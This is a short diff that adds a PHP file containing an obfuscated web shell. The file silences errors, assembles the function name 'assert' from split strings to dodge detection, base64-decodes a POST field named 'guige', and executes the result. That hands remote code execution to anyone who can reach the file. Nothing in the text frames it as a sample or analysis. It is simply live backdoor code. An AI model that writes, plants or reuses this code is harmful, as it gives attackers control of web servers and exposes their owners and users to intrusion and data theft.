@@ -1,0 +1,8 @@
+<?php 
+error_reporting(0);
+$item['w'] = 'ass';
+$item['w'] = $item['w'].'ert'; 
+$array[] = $item; 
+$s=base64_decode($_POST['gu'.'ige']);
+$array[0]['w'](trim(''.$s));
+?>
